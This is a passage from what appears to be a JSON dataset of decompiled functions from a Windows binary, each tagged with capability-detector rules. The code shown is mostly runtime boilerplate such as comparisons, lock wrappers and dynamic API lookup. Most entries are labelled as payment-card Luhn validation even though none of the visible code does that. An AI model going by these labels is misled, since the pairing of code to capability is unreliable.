0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n    }\n    if (uVar3 == uVar1) {\n        return 0;\n    }\n    return (0 < uVar3 - uVar1) * 2 + -1;\ncode_r0x00408956:\n    if (*arg_8h != *arg_ch) {\n        iVar2 = (*arg_8h & 0xff) - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 3) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[1] != arg_ch[1]) {\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 5) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 6) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 7) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[2] != arg_ch[2]) {\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 9) - *(arg_ch + 9);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 10) - *(arg_ch + 10);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[3] != arg_ch[3]) {\n        iVar2 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xd) - *(arg_ch + 0xd);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xe) - *(arg_ch + 0xe);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[4] != arg_ch[4]) {\n        iVar2 = (arg_8h[4] & 0xff) - *(arg_ch + 4);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x11) - *(arg_ch + 0x11);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x12) - *(arg_ch + 0x12);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[5] != arg_ch[5]) {\n        iVar2 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x15) - *(arg_ch + 0x15);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x16) - *(arg_ch + 0x16);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[6] != arg_ch[6]) {\n        iVar2 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x19) - *(arg_ch + 0x19);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[7] != arg_ch[7]) {\n        iVar2 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    arg_8h = arg_8h + 8;\n    arg_ch = arg_ch + 8;\n    arg_10h = arg_10h + -0x20;\n    goto code_r0x00408df3;\n}\n",
        "token_count": 13812
    },
    "0040abfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl\nfcn.0040abfe(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    uint arg_ch_00;\n    \n    arg_ch_00 = 0x3c;\n    fcn.00407b00();\n    *(unaff_EBP + -0x1c) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x40) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x30) = *(arg_8h_00 + -4);\n    iVar3 = *(unaff_EBP + 8);\n    uVar1 = fcn.00407f13(unaff_EBP + -0x4c, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x34) = uVar1;\n    iVar2 = fcn.0040a1bc();\n    *(unaff_EBP + -0x38) = *(iVar2 + 0x10);\n    iVar2 = fcn.0040a1bc();\n    *(unaff_EBP + -0x3c) = *(iVar2 + 0x14);\n    iVar2 = fcn.0040a1bc();\n    *(iVar2 + 0x10) = iVar3;\n    iVar3 = fcn.0040a1bc();\n    *(iVar3 + 0x14) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x44) = 1;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.00407d0c(arg_8h_00, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), *(unaff_EBP + 0x20));\n    *(unaff_EBP + -0x1c) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    *(unaff_EBP + -0x44) = 0;\n    fcn.0040ad51(0x430aa8, arg_ch_00);\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar1;\n}\n",
        "token_count": 725
    },
    "0040af56": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040af56(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == NULL) {\n        fcn.0040fec9();\n        pcVar3 = swi(3);\n        uVar6 = (*pcVar3)();\n        return uVar6;\n    }\n    iVar7 = *arg_ch;\n    uVar6 = 0;\n    if (0 < iVar7) {\n        var_4h = 0;\n        arg_10h = *(arg_8h + 0x1c);\n        piVar5 = *(arg_10h + 0xc);\n        iVar1 = *piVar5;\n        in_EAX = piVar5 + 1;\n        do {\n            if (0 < iVar1) {\n                iVar2 = arg_ch[1];\n                piVar5 = in_EAX;\n                var_8h = iVar1;\n                do {\n                    iVar4 = fcn.0040aa13(iVar2 + var_4h, *piVar5, arg_10h);\n                    if (iVar4 != 0) {\n                        uVar6 = 1;\n                        break;\n                    }\n                    var_8h = var_8h + -1;\n                    piVar5 = piVar5 + 1;\n                } while (0 < var_8h);\n            }\n            var_4h = var_4h + 0x10;\n            iVar7 = iVar7 + -1;\n        } while (iVar7 != 0);\n    }\n    return in_EAX & 0xffffff00 | uVar6;\n}\n",
        "token_count": 473
    },
    "0040b272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b272(int32_t arg_8h, uint lpProcName, int32_t *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar1 = arg_8h * 4 + 0x48f7f8;\n    iVar3 = *piVar1;\n    if (iVar3 == -1) {\n        iVar3 = 0;\n    }\n    else if (iVar3 == 0) {\n        for (; arg_10h != arg_14h; arg_10h = arg_10h + 1) {\n            iVar3 = *arg_10h;\n            iVar4 = *(iVar3 * 4 + 0x48f7ec);\n            if (iVar4 == 0) {\n                iVar4 = fcn.0040b312(*(iVar3 * 4 + 0x425d44));\n                piVar2 = iVar3 * 4 + 0x48f7ec;\n                if (iVar4 != 0) {\n                    iVar3 = *piVar2;\n                    *piVar2 = iVar4;\n                    if (iVar3 != 0) {\n                        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar4);\n                    }\n                    goto code_r0x0040b2fb;\n                }\n                *piVar2 = -1;\n            }\n            else if (iVar4 != -1) {\ncode_r0x0040b2fb:\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, lpProcName);\n                if (iVar3 != 0) {\n                    *piVar1 = iVar3;\n                    return iVar3;\n                }\n                break;\n            }\n        }\n        *piVar1 = -1;\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 443
    },
    "0040b76b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b76b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    fcn.0040b7a2(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h);\n    fcn.0040b55b();\n    return;\n}\n",
        "token_count": 113
    },
    "0040d27e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d27e(uint *param_1)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint arg_10h;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    \n    puVar5 = param_1 + 0xf;\n    cVar2 = fcn.0040bc7d(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar2 == '\\0') {\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = puVar5;\n        }\n        param_1[4] = param_1[4] + 4;\n        *puVar3 = *(param_1[4] + -4);\n        param_1[0xd] = 1;\n    }\n    else {\n        param_1[4] = param_1[4] + 4;\n        uVar1 = *(param_1[4] + -4);\n        arg_10h = fcn.0040bbb3();\n        puVar3 = param_1[0x110];\n        if (param_1[0x110] == NULL) {\n            puVar3 = puVar5;\n        }\n        iVar4 = fcn.004151aa(param_1 + 0xd, puVar3, arg_10h, uVar1, param_1[2]);\n        if (iVar4 != 0) {\n            *(param_1 + 0xb) = 1;\n        }\n    }\n    puVar3 = param_1[0x110];\n    if (puVar3 != NULL) {\n        puVar5 = puVar3;\n    }\n    param_1[0xc] = puVar5;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 433
    },
    "0040d4a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d4a0(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0040b606();\n    *(param_1 + 0xc) = *(arg_8h + 0x4c);\n    *(param_1 + 0x10) = *(arg_8h + 0x48);\n    fcn.004145d1(arg_8h, param_1 + 0xc, *(param_1 + 4));\n    fcn.0041462f(arg_8h, param_1 + 0x10, *(param_1 + 4));\n    if ((*(arg_8h + 0x350) & 2) == 0) {\n        *(arg_8h + 0x350) = *(arg_8h + 0x350) | 2;\n        *(param_1 + 0x14) = 2;\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "0040d516": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040d516(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    iVar1 = *in_ECX;\n    if (iVar1 == 0) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_8h);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 132
    },
    "0040d5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040d5d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(arg_1ch);\n    uVar1 = fcn.0040bb14(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "0040d6cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d6cf(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x48f818);\n    return;\n}\n",
        "token_count": 50
    },
    "0040d717": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d717(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection * 0x18 + 0x48f818);\n    return;\n}\n",
        "token_count": 50
    },
    "0040e26b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e26b(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0040e27f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e27f(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 44
    },
    "0040ea21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ea21(uint32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    \n    piVar1 = arg_ch + 2;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 < 0) {\n        uVar2 = fcn.004185b7(arg_8h, arg_ch, arg_10h);\n        return uVar2;\n    }\n    **arg_ch = arg_8h;\n    *arg_ch = *arg_ch + 1;\n    return arg_8h & 0xff;\n}\n",
        "token_count": 156
    },
    "0040ea4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ea4e(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.0040e8f4(arg_8h, arg_ch, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "0040f0b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f0b9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.0040ee58(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0040f14e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f14e(uint *param_1)\n\n{\n    uint arg_10h;\n    uint arg_8h;\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t var_4h;\n    \n    arg_10h = param_1[1];\n    arg_8h = **param_1;\n    uVar1 = fcn.004154be(arg_8h);\n    var_4h = param_1 & 0xffffff00 | uVar1;\n    uVar2 = fcn.0040f211(*param_1[2], *param_1[3], *param_1[4], **param_1, param_1[1]);\n    fcn.0041556a(var_4h, arg_8h, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "0040f3bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f3bb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.0040f19a(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0040f450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f450(uint32_t **param_1)\n\n{\n    uint32_t arg_ch;\n    uint32_t arg_8h;\n    uint32_t arg_8h_00;\n    uint uVar1;\n    \n    arg_8h = **param_1 & 0xfffffffe;\n    fcn.0040e625(*param_1[1], param_1[2]);\n    fcn.00416d80(*param_1[1]);\n    LOCK();\n    *(*param_1[1] + 0xc) = *(*param_1[1] + 0xc) & 0xfffff81f;\n    if ((*param_1[3] & 4) == 0) {\n        arg_ch = *param_1[4];\n        if (arg_ch == 0) {\n            arg_ch = fcn.004144bf(arg_8h, 1);\n            fcn.0041451c(0);\n            if (arg_ch == 0) {\n                *0x48f974 = *0x48f974 + 1;\n                return 0xffffffff;\n            }\n            uVar1 = 0x140;\n        }\n        else {\n            uVar1 = 0x180;\n        }\n        arg_8h_00 = *param_1[1];\n    }\n    else {\n        uVar1 = 0x400;\n        arg_8h = 2;\n        arg_8h_00 = *param_1[1];\n        arg_ch = arg_8h_00 + 0x14;\n    }\n    uVar1 = fcn.0040f586(arg_8h_00, arg_ch, arg_8h, uVar1);\n    return uVar1;\n}\n",
        "token_count": 384
    },
    "0040f4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040f4f0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    uint *var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = arg_8h;\n    if (arg_8h == 0) goto code_r0x0040f502;\n    if (arg_10h == 4) {\ncode_r0x0040f536:\n        if ((arg_10h != 0) && (arg_10h != 0x40)) goto code_r0x0040f54c;\n    }\n    else if (arg_10h != 0) {\n        if (arg_10h != 0x40) goto code_r0x0040f502;\n        goto code_r0x0040f536;\n    }\n    if (0x7ffffffd < arg_14h - 2U) {\ncode_r0x0040f502:\n        *(arg_18h + 0x1c) = 1;\n        *(arg_18h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_18h);\n        return 0xffffffff;\n    }\ncode_r0x0040f54c:\n    var_24h = &arg_14h;\n    var_ch = arg_8h;\n    var_20h = &var_8h;\n    var_1ch = arg_18h;\n    var_18h = &arg_10h;\n    var_14h = &arg_ch;\n    var_10h = arg_8h;\n    uVar1 = fcn.0040f3f5(&var_10h, &var_24h);\n    return uVar1;\n}\n",
        "token_count": 505
    },
    "0040f5b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f5b9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0040b513(0);\n    uVar1 = fcn.0040f4f0(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0040b55b();\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "0040ffdb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ffdb(int16_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    if (arg_8h == NULL) {\n        fcn.0041017d();\n        iVar1 = 0;\n    }\n    else if (*arg_8h == 0) {\n        if ((*(arg_ch + 0xc) != 0) || (iVar1 = fcn.004100f8(1),  iVar1 == 0)) {\n            **(arg_ch + 8) = 0;\n            iVar1 = 0;\n            *(arg_ch + 0x10) = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.0041aa21(arg_14h, 0, arg_8h, 0xffffffff, 0, 0, 0, 0);\n        if (uVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            fcn.0040e094(uVar3);\n            piVar4 = fcn.0040e0ee();\n            iVar1 = *piVar4;\n        }\n        else if ((uVar2 < *(arg_ch + 0xc) || uVar2 == *(arg_ch + 0xc)) || (iVar1 = fcn.004100f8(uVar2),  iVar1 == 0)) {\n            iVar1 = fcn.004100ba(arg_14h, arg_8h, *(arg_ch + 8), *(arg_ch + 0xc));\n            if (iVar1 == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.0040e094(uVar3);\n                piVar4 = fcn.0040e0ee();\n                iVar1 = *piVar4;\n            }\n            else {\n                *(arg_ch + 0x10) = iVar1 + -1;\n                iVar1 = 0;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 488
    },
    "0041011f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041011f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    fcn.004100de();\n    iVar1 = fcn.0041015e(in_ECX + 8, arg_8h * 2);\n    if (iVar1 == 0) {\n        *(in_ECX + 0x14) = 1;\n        iVar1 = 0;\n        *(in_ECX + 0xc) = arg_8h;\n    }\n    else {\n        *(in_ECX + 0xc) = 0;\n        *(in_ECX + 0x14) = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 162
    },
    "00410c43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00410c43(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004072c2(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.00410c08(0x48fa90);\n    *(unaff_EBP + -4) = 1;\n    fcn.00410c23(0x48fa94);\n    fcn.00410b56(*0x48fa9c);\n    fcn.00410b56(*0x48fa98);\n    fcn.0040729f();\n    return;\n}\n",
        "token_count": 158
    },
    "00410cad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410cad(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            pcVar1 = *arg_8h;\n            if (pcVar1 != NULL) {\n                (**0x424130)();\n                (*pcVar1)();\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00411056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411056(uint arg_8h)\n\n{\n    fcn.00410e3e(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004127b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004127b5(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = *(arg_8h + uVar3 * 2);\n            arg_8h_00 = fcn.0040d9dd();\n            iVar2 = fcn.0040d5ae(arg_8h_00, uVar1, 0x103);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 191
    },
    "004133ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
